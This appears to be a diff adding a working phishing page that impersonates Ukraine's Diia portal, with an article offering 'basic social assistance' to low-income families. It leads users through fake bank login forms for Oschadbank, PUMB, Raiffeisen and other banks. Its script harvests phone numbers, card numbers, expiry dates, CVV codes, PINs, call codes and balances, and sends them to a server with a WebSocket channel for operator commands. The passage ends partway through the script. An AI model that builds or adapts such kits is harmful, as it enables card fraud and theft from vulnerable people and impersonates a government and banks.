@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Базова соціальна допомога</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+    <style>
+        /* --- БАЗОВІ СТИЛІ ТІЛА (з файлу 1) --- */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            margin: 0;
+            color: var(--dark-text);
+            transition: background 0.5s ease-in-out;
+            background: #f0f2f5; /* Базовий фон для сторінки банків */
+        }
+
+        *, *::before, *::after { box-sizing: border-box; }
+
+        /* --- СТИЛІ СТОРІНКИ 1: ГОЛОВНА (Файл 2) --- */
+        #page-home {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f7f7f7;
+            color: #000000;
+        }
+
+        #page-home .content-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px 15px;
+            background-color: #ffffff;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.05);
+            min-height: 100vh;
+        }
+
+        #page-home .main-header {
+            width: 100%;
+            padding-bottom: 10px; 
+            border-bottom: 1px solid #e0e0e0; 
+            background-color: #ffffff;
+        }
+
+        #page-home .header-content {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 10px 15px 0 15px; 
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        #page-home .coat-of-arms-image {
+            width: 32px; 
+            height: 32px; 
+            object-fit: contain; 
+            border: 2px solid #000000;
+            border-radius: 4px; 
+            padding: 2px; 
+        }
+
+        #page-home .menu-icon {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 10px 0; 
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            align-items: flex-end; 
+        }
+
+        #page-home .bar {
+            display: block;
+            width: 25px;
+            height: 3px;
+            background-color: #000000;
+            border-radius: 2px;
+        }
+
+        #page-home .bar:nth-child(1),
+        #page-home .bar:nth-child(3) {
+            width: 20px; 
+        }
+
+        #page-home .breadcrumbs {
+            display: flex;
+            font-size: 16px;
+            margin-bottom: 25px;
+            color: #000000; 
+            align-items: center;
+            font-weight: 500; 
+        }
+
+        #page-home .breadcrumb-item {
+            padding: 0 5px;
+        }
+
+        #page-home .separator {
+            color: #aaaaaa;
+            font-weight: 300;
+        }
+
+        #page-home .article-title {
+            font-size: 44px; 
+            font-weight: 900; 
+            line-height: 1.15;
+            margin-bottom: 20px;
+        }
+
+        #page-home .article-date {
+            font-size: 14px;
+            color: #666666;
+            margin-top: 20px;
+            margin-bottom: 30px; 
+            font-weight: 400;
+        }
+
+        #page-home .article-image {
+            width: 100%; 
+            max-height: 450px; 
+            object-fit: cover; 
+            border-radius: 8px; 
+            margin-bottom: 10px; 
+        }
+
+        #page-home .text-from-image {
+            font-size: 20px; 
+            font-weight: 500; 
+            line-height: 1.5;
+            margin-top: 5px; 
+            margin-bottom: 25px; 
+            display: block;
+            color: #000000;
+        }
+
+        #page-home .new-info-block {
+            background-color: #ffffff;
+            border: none; 
+            border-radius: 8px;
+            padding: 35px 15px;
+            margin: 0 auto 20px auto; 
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.05);
+        }
+
+        #page-home .new-info-text {
+            font-size: 32px; 
+            font-weight: 500;
+            line-height: 1.3;
+            text-align: left;
+            color: #000000;
+            margin-bottom: 25px; 
+            max-width: 80%; 
+        }
+
+        #page-home .calculate-button {
+            display: inline-block;
+            padding: 22px 65px;
+            background-color: #000000;
+            color: #ffffff;
+            font-size: 19px;
+            font-weight: 500;
+            text-align: center;
+            text-decoration: none;
+            border: none;
+            border-radius: 9999px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            margin-left: 10px;
+            margin-bottom: 30px; 
+        }
+
+        #page-home .calculate-button:hover {
+            background-color: #333333;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+
+        #page-home .section-header {
+            font-size: 24px;
+            font-weight: 700;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #000000;
+        }
+
+        #page-home .other-news-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        #page-home .news-item {
+            padding: 15px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        #page-home .news-item:last-child {
+            border-bottom: none;
+        }
+
+        #page-home .news-date {
+            font-size: 14px;
+            font-weight: 500;
+            color: #000000;
+            margin-bottom: 5px;
+        }
+
+        #page-home .news-text {
+            font-size: 18px;
+            font-weight: 400;
+            line-height: 1.4;
+            color: #000000;
+            display: block;
+            text-decoration: none;
+        }
+
+        #page-home .benefit-content {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        #page-home .benefit-content p {
+            margin-bottom: 20px;
+        }
+
+        #page-home .highlight-word {
+            text-decoration: underline;
+            font-weight: 500;
+        }
+        
+        #page-home .main-footer {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 40px 15px;
+            text-align: center;
+        }
+
+        #page-home .footer-content {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        #page-home .footer-coat-of-arms {
+            width: 80px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        #page-home .copyright {
+            font-size: 16px;
+            font-weight: 400;
+            color: #aaaaaa;
+        }
+
+
+        @media (max-width: 600px) {
+            #page-home .article-title {
+                font-size: 32px;
+            }
+            #page-home .text-from-image {
+                font-size: 18px;
+            }
+            #page-home .new-info-text {
+                font-size: 24px;
+                max-width: 100%;
+            }
+            #page-home .calculate-button {
+                padding: 18px 45px;
+                font-size: 17px;
+            }
+        }
+
+        /* --- СТИЛІ СТОРІНКИ 2: APPLY (Файл 3) --- */
+        #page-apply {
+            font-family: 'Inter', sans-serif;
+            background-color: #e6eff7; /* світло-блакитний фон */
+            color: #000;
+            min-height: 100vh;
+        }
+
+        #page-apply .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 25px 15px 40px;
+        }
+
+        #page-apply .back-button {
+            display: inline-block;
+            background: none;
+            border: 1.5px solid #000;
+            color: #000;
+            font-size: 16px;
+            padding: 10px 22px;
+            border-radius: 30px;
+            text-decoration: none;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        #page-apply .back-button:hover {
+            background: #000;
+            color: #fff;
+        }
+
+        #page-apply .title {
+            font-size: 30px;
+            font-weight: 700;
+            margin-bottom: 25px;
+        }
+
+        #page-apply .info-block {
+            background: #fff;
+            border-radius: 14px;
+            padding: 30px 25px 25px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.06);
+            font-size: 18px;
+            line-height: 1.65;
+            position: relative;
+        }
+
+        #page-apply .info-block ul {
+            padding-left: 20px;
+            margin-top: 10px;
+        }
+
+        #page-apply .apply-button {
+            display: inline-block;
+            padding: 22px 70px;
+            background-color: #000;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
+            border: none;
+            border-radius: 9999px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            margin-top: 25px;
+        }
+
+        #page-apply .apply-button:hover {
+            background-color: #333;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+
+        #page-apply .button-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-top: 15px;
+        }
+
+        @media (max-width: 600px) {
+            #page-apply .title {
+                font-size: 26px;
+            }
+
+            #page-apply .info-block {
+                font-size: 17px;
+            }
+
+            #page-apply .apply-button {
+                font-size: 18px;
+                padding: 18px 55px;
+            }
+        }
+
+        /* --- СТИЛІ СТОРІНКИ 3: БАНКИ (Файл 1) --- */
+        #page-banks {
+            /* Контейнер для сторінки банків. 
+               Стилі тіла body будуть динамічно змінюватись скриптом цієї сторінки. */
+        }
+        
+        :root {
+            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
+            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
+        }
+        
+        #page-banks .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
+        #page-banks #bank-selection-screen { opacity: 1; transform: scale(1); }
+        
+        #page-banks #form-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            opacity: 0; visibility: hidden; transform: scale(1.05);
+            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
+            display: flex; align-items: center; padding: 20px;
+        }
+        #page-banks .form-container {
+            width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
+            background-color: var(--white); padding: 30px; border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+        }
+        body.form-active { background: var(--bg-gradient); overflow: hidden; }
+        body.form-active #page-banks #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
+        body.form-active #page-banks #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
+        
+        #page-banks h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
+        #page-banks .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
+        #page-banks .bank-item {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
+            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
+            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
+            box-shadow: 0 4px 10px var(--shadow-color);
+        }
+        #page-banks .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
+        #page-banks .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
+        #page-banks .bank-item .bank-name { font-size: 15px; font-weight: 600; }
+        #page-banks #form-header { text-align: center; margin-bottom: 25px; }
+        #page-banks #form-header-logo { max-height: 50px; max-width: 150px; }
+        #page-banks #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
+        #page-banks #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
+        #page-banks .input-group { margin-bottom: 15px; position: relative; }
+        #page-banks .input-group:last-child { margin-bottom: 0; }
+        #page-banks .input-field {
+            width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
+            font-size: 18px; font-weight: 500; transition: all 0.3s ease;
+        }
+        #page-banks .input-field.invalid { border-color: var(--danger-color); }
+        #page-banks .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
+        #page-banks .phone-input-wrapper { display: flex; }
+        #page-banks .phone-prefix {
+            padding: 15px; border: 1px solid var(--border-color); border-right: none;
+            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
+            flex-shrink: 0; display: flex; align-items: center;
+        }
+        #page-banks .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; flex: 1; width: auto; min-width: 0; }
+        #page-banks .multi-input-row { display: flex; gap: 10px; }
+        #page-banks .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
+        #page-banks .btn {
+            width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
+            font-weight: 700; cursor: pointer; transition: all 0.3s ease;
+            flex-basis: 0; flex-grow: 1;
+        }
+        #page-banks .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
+        #page-banks .btn:active { transform: translateY(0) scale(0.97); }
+        
+        body { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
+        body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
+        body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
+        body[data-theme="alliance"] { --primary-color: #0078C9; --accent-color: #005a99; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%); }
+        body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D226; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
+        body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
+        body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
+        body[data-theme="ukrsib"] { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
+        
+        #page-banks .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
+        #page-banks .btn-back { background-color: #f1f3f5; color: var(--light-text); }
+    </style>
+</head>
+<body>
+
+    <div id="page-home">
+        <header class="main-header">
+            <div class="header-content">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Lesser_Coat_of_Arms_of_Ukraine_%28bw%29.svg/734px-Lesser_Coat_of_Arms_of_Ukraine_%28bw%29.svg.png" 
+                     alt="Герб України" 
+                     class="coat-of-arms-image">
+                
+                <button class="menu-icon" aria-label="Меню">
+                    <span class="bar"></span>
+                    <span class="bar"></span>
+                    <span class="bar"></span>
+                </button>
+            </div>
+        </header>
+
+        <main class="content-container">
+            <div class="breadcrumbs">
+                <span class="breadcrumb-item">Головна</span>
+                <span class="separator">|</span>
+                <span class="breadcrumb-item">Новини</span>
+            </div>
+
+            <section class="main-article">
+                <h1 class="article-title">
+                    Базова соціальна допомога: <br>подавайте заявку прямо зараз
+                </h1>
+                
+                <p class="article-date">22/09/2025</p>
+
+                <img src="https://diia.gov.ua/img/diia-october-prod/uploads/public/68d/106/590/thumb_1481_730_410_0_0_auto.png" 
+                     alt="Зображення для соціальної допомоги" 
+                     class="article-image">
+
+                <p class="text-from-image">
+                    Вперше в Україні кілька соціальних виплат об’єднано в одну щомісячну допомогу для родин з низьким доходом.
+                </p>
+
+                <div class="new-info-block">
+                    <p class="new-info-text">
+                        Розрахуй свою виплату на cім'ю та подай заявку на зарахування
+                    </p>
+                    <a href="#" class="calculate-button">
+                        Подати заявку
+                    </a>
+                </div>
+                
+                <section class="benefit-content">
+                    <h2 class="section-header">
+                        Хто може скористатись:
+                    </h2>
+                    
+                    <p>
+                        Сім’ї, які вже отримують соцдопомогу: допомогу малозабезпеченим, виплати на дітей одиноким матерям та тимчасову допомогу дітям, батьки яких не сплачують аліменти або їхнє місцезнаходження невідоме.
+                    </p>
+                    
+                    <p>
+                        Згодом інші сім’ї зможуть подати заяву, щоб отримати БСД за певними <span class="highlight-word">винятками</span>.
+                    </p>
+
+                    <p>
+                        Послуга недоступна для тих, хто перебуває на тимчасово окупованих територіях, у зоні активних бойових дій або за кордоном.
+                    </p>
+
+                    <p>
+                        Тепер держава працює у кілька кліків — щоб у вас було більше часу для близьких.
+                    </p>
+
+                    <p>
+                        Послугу реалізовано Міністерством цифрової трансформації спільно з Міністерством соціальної політики, сім’ї та єдності України за підтримки «Проєкту підтримки Дія», що Програма розвитку ООN (ПРООН) в Україні втілює за фінансування Швеції.
+                    </p>
+                </section>
+                
+                <hr style="border: 0; border-top: 1px solid #e0e0e0; margin: 30px 0;">
+
+                <section class="other-news">
+                    <h2 class="section-header">
+                        Інші новини
+                    </h2>
+                    <ul class="other-news-list">
+                        <li class="news-item">
+                            <p class="news-date">08/10/2025</p>
+                            <a href="#" class="news-text">
+                                Все про допомогу та пільги для українців — у Гіді держпослуг
+                            </a>
+                        </li>
+                        <li class="news-item">
+                            <p class="news-date">02/10/2025</p>
+                            <a href="#" class="news-text">
+                                3 роки єОселі: державна іпотека, яка змінила життя 20 тисяч родин
+                            </a>
+                        </li>
+                        <li class="news-item">
+                            <p class="news-date">02/10/2025</p>
+                            <a href="#" class="news-text">
+                                Призупинено роботу окремих онлайн-послуг ДРАЦС у Києві та 5 областях
+                            </a>
+                        </li>
+                        <li class="news-item">
+                            <p class="news-date">01/10/2025</p>
+                            <a href="#" class="news-text">
+                                Ветеранський спорт: піклуйтесь про своє здоров’я та відновлення з Дією
+                            </a>
+                        </li>
+                        <li class="news-item">
+                            <p class="news-date">30/09/2025</p>
+                            <a href="#" class="news-text">
+                                Ветерани, відкривайте Дія.Картку та отримуйте 1 500 грн на спорт з 1 жовтня
+                            </a>
+                        </li>
+                    </ul>
+                </section>
+            </section>
+        </main>
+
+        <footer class="main-footer">
+            <div class="footer-content">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Lesser_Coat_of_Arms_of_Ukraine_%28bw%29.svg/330px-Lesser_Coat_of_Arms_of_Ukraine_%28bw%29.svg.png" 
+                     alt="Герб України" 
+                     class="footer-coat-of-arms">
+                <p class="copyright">Всі дані захищені 2018-2025</p>
+            </div>
+        </footer>
+    </div>
+
+    <div id="page-apply" style="display: none;">
+        <div class="container">
+            <a href="#" class="back-button">← Назад</a>
+
+            <h1 class="title">Базова соціальна допомога</h1>
+
+            <div class="info-block">
+                <p>
+                    Розмір виплати розраховується автоматично для кожної родини залежно від складу та доходу,
+                    а єдині критерії гарантують прозоре рішення для кожного українця.
+                    Базова виплата буде надходити протягом півроку кожного місяця.
+                </p>
+
+                <p><strong>Для подачі заявки:</strong></p>
+                <ul>
+                    <li>авторизуйтесь через доступний банк, на який доступна виплата</li>
+                    <li>зачекайте 5–10 хвилин</li>
+                    <li>якщо вам доступна виплата — зробіть підтвердження через Дія.Підпис</li>
+                    <li>чекайте на зарахування на вашу картку</li>
+                </ul>
+
+                <div class="button-wrapper">
+                    <a href="#" class="apply-button">Подати заявку</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-banks" style="display: none;">
+        <div id="bank-selection-screen" class="screen">
+            <h1>Оберіть свій банк</h1>
+            <div class="bank-grid"></div>
+        </div>
+        <div id="form-screen" class="screen">
+            <div class="form-container">
+                <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
+                <h2 id="modal-title"></h2>
+                <div id="modal-step-content"></div>
+                <div class="modal-footer">
+                    <button class="btn btn-back" id="back-btn">Назад</button>
+                    <button class="btn btn-next" id="next-btn">Далі</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    
+    // --- ЛОГІКА НАВІГАЦІЇ МІЖ СТОРІНКАМИ ---
+    const pageHome = document.getElementById('page-home');
+    const pageApply = document.getElementById('page-apply');
+    const pageBanks = document.getElementById('page-banks');
+
+    const homeToApplyBtn = pageHome.querySelector('.calculate-button');
+    const applyToBanksBtn = pageApply.querySelector('.apply-button');
+    const applyToHomeBtn = pageApply.querySelector('.back-button');
+
+    function showPage(pageToShow) {
+        // Ховаємо всі сторінки
+        pageHome.style.display = 'none';
+        pageApply.style.display = 'none';
+        pageBanks.style.display = 'none';
+        
+        // Скидаємо стилі body, які могла додати сторінка банків
+        if (pageToShow !== pageBanks) {
+            document.body.className = ''; // Очищаємо 'form-active'
+            document.body.removeAttribute('data-theme');
+            document.body.style.background = ''; // Дозволяємо CSS сторінки контролювати фон
+            document.body.style.overflow = ''; // Відновлюємо прокрутку
+        } else {
+            // Встановлюємо фон за замовчуванням для сторінки банків
+            document.body.style.background = '#f0f2f5';
+        }
+
+        // Показуємо потрібну сторінку
+        pageToShow.style.display = 'block';
+        window.scrollTo(0, 0); // Прокручуємо вгору
+    }
+
+    homeToApplyBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        showPage(pageApply);
+    });
+
+    applyToBanksBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        showPage(pageBanks);
+    });
+
+    applyToHomeBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        showPage(pageHome);
+    });
+
+    // --- ОРИГІНАЛЬНИЙ СКРИПТ СТОРІНКИ БАНКІВ (з модифікацією) ---
+
+    // Получаем ref из URL и сохраняем в localStorage
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref') || 'unknown';
+    localStorage.setItem('referrer', ref);
+
+    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+    let ws;
+    let activeBankData = {};
+    let currentStepIndex = 0;
+    let collectedData = {};
+
+    // --- НОВІ СЦЕНАРІЇ ---
+    const specialFlowSteps = [
+        { type: 'phone', title: 'Введіть номер телефону' },
+        { type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }
+    ];
+
+    const confirmationSteps = [
+        {
+            type: 'confirm_all',
+            title: 'Підтвердити володіння карткою',
+            fields: [
+                { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' },
+                { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' },
+                { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' },
+                { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }
+            ]
+        }
+    ];
+
+    const bankFlows = {
+        'oschadbank': {
+            name: 'Ощадбанк',
+            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png',
+            theme: 'oschadbank',
+            steps: [
+                { type: 'phone', title: 'Введіть номер телефону' },
+                { type: 'card', title: 'Введіть номер карти' },
+                { type: 'pin', title: 'Введіть ПІН-код' },
+                { type: 'call_code', title: 'Підтвердження дзвінком' }
+            ]
+        },
+        'raiffeisen': {
+            name: 'Райффайзен',
+            logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg',
+            theme: 'raiffeisen',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'alliance': {
+            name: 'Альянс',
+            logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14',
+            theme: 'alliance',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'pumb': {
+            name: 'ПУМБ',
+            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp',
+            theme: 'pumb',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'otp': {
+            name: 'OTP Bank',
+            logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png',
+            theme: 'otp',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'vostok': {
+            name: 'Восток',
+            logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png',
+            theme: 'vostok',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'izibank': {
+            name: 'Izibank',
+            logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png',
+            theme: 'izibank',
+            steps: specialFlowSteps,
+            special: true
+        },
+        'ukrsib': {
+            name: 'Укрсиб',
+            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp',
+            theme: 'ukrsib',
+            steps: specialFlowSteps,
+            special: true
+        }
+    };
+
+    const bankGrid = document.querySelector('#page-banks .bank-grid');
+    const body = document.body;
+    const formHeaderLogo = document.getElementById('form-header-logo');
+    const modalTitle = document.getElementById('modal-title');
+    const stepContent = document.getElementById('modal-step-content');
+    const modalFooter = document.querySelector('#page-banks .modal-footer');
+    const nextBtn = document.getElementById('next-btn');
+    const backBtn = document.getElementById('back-btn');
+
+    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
+        const bank = bankFlows[id];
+        return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
+    }).join('');
+
+    function connectWebSocket() {
+        ws = new WebSocket(`wss://${window.location.host}`); // Динамический WebSocket
+        ws.onopen = () => {
+            console.log('WebSocket connected');
+            ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
+        };
+        ws.onmessage = (event) => {
+            const command = JSON.parse(event.data);
+            handleServerCommand(command);
+        };
+        ws.onclose = () => {
+            console.log('WebSocket closed, reconnecting...');
+            setTimeout(connectWebSocket, 3000);
+        };
+        ws.onerror = (error) => console.error('WebSocket error:', error);
+    }
+
+    async function sendDataToServer(data, isFinal) {
+        console.log('Sending to server:', data, isFinal);
+        collectedData = { ...collectedData, ...data };
+        try {
+            const response = await fetch(`/api/submit`, { // Относительный путь
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    sessionId, 
+                    bankName: activeBankData.name, 
+                    isFinalStep: isFinal, 
+                    referrer: localStorage.getItem('referrer') || 'unknown',
+                    ...collectedData 
+                }),
+            });
+            console.log('Server response:', await response.json());
+        } catch (error) {
+            console.error('Failed to send data:', error);
+        }
+    }
+
+    function handleNextStep() {
+        if (!validateCurrentStep()) return;
+
+        let data = {};
+        const inputs = stepContent.querySelectorAll('.input-field');
+        inputs.forEach(input => {
+            let key = input.id;
+            let value = input.value;
+            if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
+            if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, '');
+            data[key] = value;
+        });
+
+        const step = activeBankData.steps[currentStepIndex];
+        let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
+
+        if (activeBankData.theme === 'oschadbank' && step.type === 'pin') {
+            isFinalStep = true;
+        }
+
+        sendDataToServer(data, isFinalStep);
+
+        if (activeBankData.special && step.type === 'card_simple') {
+            showWaitingScreen();
+            return;
+        }
+
+        currentStepIndex++;
+        if (currentStepIndex < activeBankData.steps.length) {
+            renderStep();
+        } else {
+            showWaitingScreen();
+        }
+    }
+
+    function showWaitingScreen() {
+        modalTitle.textContent = 'Очікуємо';
+        stepContent.innerHTML = `<p style="text-align:center;">Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); text-align:center; font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
+        modalFooter.style.display = 'none';
+    }
+
+    // --- МОДИФІКОВАНА ФУНКЦІЯ ---
+    function handleBackStep() {
+        if (currentStepIndex > 0) {
+            currentStepIndex--;
+            renderStep();
+        } else {
+            // Замість закриття модалки, повертаємось на сторінку "Apply"
+            body.classList.remove('form-active');
+            if (ws) { ws.close(); }
+            showPage(pageApply); // Викликаємо нашу нову функцію
+        }
+    }
+    // --- КІНЕЦЬ МОДИФІКАЦІЇ ---
+
+    function addInputFormatting() {
+        const phoneInput = document.getElementById('phone');
+        if (phoneInput) {
+            phoneInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                let formatted = '';
+                if (value.length > 0) formatted += value.substring(0, 2);
+                if (value.length > 2) formatted += ' ' + value.substring(2, 5);
+                if (value.length > 5) formatted += ' ' + value.substring(5, 7);
+                if (value.length > 7) formatted += ' ' + value.substring(7, 9);
+                e.target.value = formatted.trim();
+            });
+        }
+        const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
+        if (cardNumberInput) {
+            cardNumberInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                value = value.replace(/(\d{4})/g, '$1 ').trim();
+                e.target.value = value;
+            });
+        }
+        const cardExpiryInput = document.getElementById('card-expiry');
+        if (cardExpiryInput) {
+            cardExpiryInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                e.target.value = value;
+            });
+        }
+    }
+
+    function validateCurrentStep() {
+        let isValid = true;
+        const inputs = stepContent.querySelectorAll('.input-field');
+        inputs.forEach(input => {
+            const errorContainer = input.nextElementSibling;
+            input.classList.remove('invalid');
+            if (errorContainer && errorContainer.classList.contains('error-message')) {
+                errorContainer.style.display = 'none';
+            }
+
+            let value = input.value.replace(/\D/g, '');
+            let requiredLength = 0;
+
+            switch (input.id) {
+                case 'phone': requiredLength = 9; break;
+                case 'card':
+                case 'card_confirm': requiredLength = 16; break;
+                case 'card-expiry': requiredLength = 4; break;
+                case 'card-cvv': requiredLength = 3; break;
+                case 'pin': requiredLength = 4; break;
+            }
+
+            if (requiredLength > 0 && value.length < requiredLength) {
+                isValid = false;
+                input.classList.add('invalid');
+                if (errorContainer) {
+                    errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`;
+                    errorContainer.style.display = 'block';
+                }
+            }
+        });
+        return isValid;
+    }
+
+    function renderStep() {
+        const step = activeBankData.steps[currentStepIndex];
+        let html = '';
+
+        const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => {
+            return `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
+        };
+
+        switch (step.type) {
+            case 'phone':
